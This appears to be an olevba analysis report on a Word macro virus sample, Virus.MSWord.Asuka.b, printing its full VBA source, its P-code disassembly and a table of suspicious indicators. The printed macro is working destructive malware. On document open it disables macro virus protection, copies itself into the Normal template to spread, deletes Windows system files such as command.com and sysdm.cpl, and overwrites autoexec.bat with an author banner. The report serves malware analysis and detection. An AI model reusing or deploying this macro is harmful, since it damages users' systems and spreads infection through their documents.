olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Asuka.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Asuka.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.vba 
in file: ./Virus.MSWord.Asuka.b - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function Donde_esta_Windowsdirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Sub AutoOpen()
Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
ShowVisualBasicEditor = False
Dim DirName As String
Dim Shinji As String
    DirName = Donde_esta_Windows()
    Shinji = DirName
On Error GoTo RutinaDeError
ActiveDocument.SaveAs FileName:=NormalTemplate.Path & "\" & NormalTemplate.Name, FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Kill (Shinji + "command.com")
Kill (Shinji + "winfile.exe")
Kill (Shinji + "\system\appwiz.cpl")
Kill (Shinji + "\system\sysdm.cpl")
'aca van los archivos: c:\windows\explorer.exe, c:\windows\winfile.exe, c:\windows\command.com, c:\windows\system\appwiz.cpl, c:\windows\system\sysdm.cpl, acuerdate de poner Shinji
Open "c:\autoexec.bat" For Output As #1
Print #1, "@echo off"
Print #1, "cls"
Print #1, "ECHO          *********************************************************"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                    ViRuS: ASUKA AT                    *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                         AUTOR:                        *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                  ©©©© ZaHACKieL  ©©©©                 *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                      LIMA - PERU                      *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                       03/JUN/00                       *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                     ®®®®®®®®®®®®®®                    *"
Print #1, "ECHO          *                     §            §                    *"
Print #1, "ECHO          *                     §   A.B.G    §                    *"
Print #1, "ECHO          *********************************************************"
Print #1, "pause"
Close #1
Application.Visible = False
RutinaDeError:
Exit Sub
End Sub

Function Donde_esta_Windows() As String
    Dim Temp As String
    Dim Ret As Long
    Const MAX_LENGTH = 145

    Temp = String$(MAX_LENGTH, 0)
    Ret = Donde_esta_Windowsdirectory(Temp, MAX_LENGTH)
    Temp = Left$(Temp, Ret)
    If Temp <> "" And Right$(Temp, 1) <> "\" Then
        Donde_esta_Windows = Temp & "\"
    Else
        Donde_esta_Windows = Temp
    End If
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Asuka.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 917 bytes
' Line #0:
' Macros/VBA/Módulo1 - 6758 bytes
' Line #0:
' 	FuncDefn (Private Declare Function Donde_esta_Windowsdirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' Line #2:
' 	FuncDefn (Sub AutoOpen())
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0007 "Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #5:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #6:
' 	Dim 
' 	VarDefn DirName (As String)
' Line #7:
' 	Dim 
' 	VarDefn Shinji (As String)
' Line #8:
' 	ArgsLd Donde_esta_Windows 0x0000 
' 	St DirName 
' Line #9:
' 	Ld DirName 
' 	St Shinji 
' Line #10:
' 	OnError RutinaDeError 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #12:
' 	Ld Shinji 
' 	LitStr 0x000B "command.com"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #13:
' 	Ld Shinji 
' 	LitStr 0x000B "winfile.exe"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #14:
' 	Ld Shinji 
' 	LitStr 0x0012 "\system\appwiz.cpl"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #15:
' 	Ld Shinji 
' 	LitStr 0x0011 "\system\sysdm.cpl"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #16:
' 	QuoteRem 0x0000 0x00B3 "aca van los archivos: c:\windows\explorer.exe, c:\windows\winfile.exe, c:\windows\command.com, c:\windows\system\appwiz.cpl, c:\windows\system\sysdm.cpl, acuerdate de poner Shinji"
' Line #17:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *********************************************************"
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                    ViRuS: ASUKA AT                    *"
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                         AUTOR:                        *"
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                  ©©©© ZaHACKieL  ©©©©                 *"
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                      LIMA - PERU                      *"
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                       03/JUN/00                       *"
' 	PrintItemNL 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                     ®®®®®®®®®®®®®®                    *"
' 	PrintItemNL 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                     §            §                    *"
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                     §   A.B.G    §                    *"
' 	PrintItemNL 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *********************************************************"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #39:
' 	Label RutinaDeError 
' Line #40:
' 	ExitSub 
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' 	FuncDefn (Function Donde_esta_Windows() As String)
' Line #44:
' 	Dim 
' 	VarDefn Temp (As String)
' Line #45:
' 	Dim 
' 	VarDefn Ret (As Long)
' Line #46:
' 	Dim (Const) 
' 	LitDI2 0x0091 
' 	VarDefn MAX_LENGTH
' Line #47:
' Line #48:
' 	Ld MAX_LENGTH 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St Temp 
' Line #49:
' 	Ld Temp 
' 	Ld MAX_LENGTH 
' 	ArgsLd Donde_esta_Windowsdirectory 0x0002 
' 	St Ret 
' Line #50:
' 	Ld Temp 
' 	Ld Ret 
' 	ArgsLd LBound$ 0x0002 
' 	St Temp 
' Line #51:
' 	Ld Temp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Temp 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Temp 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Donde_esta_Windows 
' Line #53:
' 	ElseBlock 
' Line #54:
' 	Ld Temp 
' 	St Donde_esta_Windows 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndFunc 
' Line #57:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winfile.exe         |Executable file name                         |
|IOC       |appwiz.cpl          |Executable file name                         |
|IOC       |sysdm.cpl           |Executable file name                         |
|IOC       |explorer.exe        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

